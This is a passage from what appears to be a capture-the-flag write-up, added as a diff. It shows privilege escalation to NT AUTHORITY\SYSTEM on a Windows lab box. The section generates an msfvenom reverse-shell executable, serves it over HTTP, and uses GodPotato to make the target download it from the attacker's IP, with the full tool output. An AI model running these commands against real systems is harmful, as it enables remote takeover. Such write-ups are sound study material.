@@ -882,3 +882,51 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 SHELL> 
 ```
 Domain admin!
+
+# Shell as nt authority system
+```python
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.90 LPORT=1340 -f exe -o admin-shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: admin-shell.exe
+```
+Ive generated a payload 
+
+```python
+python3 -m http.server 1001
+Serving HTTP on 0.0.0.0 port 1001 (http://0.0.0.0:1001/) ...
+```
+Here i am hosting it
+
+```python
+SHELL> ./godpotato.exe -cmd "cmd /c  powershell -c wget http://10.10.14.90:1001/admin-shell.exe -o C:\Users\Administrator\Desktop\admin-shell.exe"
+[*] CombaseModule: 0x140705258995712
+[*] DispatchTable: 0x140705261301824
+[*] UseProtseqFunction: 0x140705260678352
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\80087a31-3f96-472d-99bf-584be14272b3\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00006402-0f20-ffff-d22c-d3b121c9759f
+[*] DCOM obj OXID: 0x9532ef76bda17be3
+[*] DCOM obj OID: 0xacffa30c7a9c412f
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 916 Token:0x812  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 3224
+```
+This tran
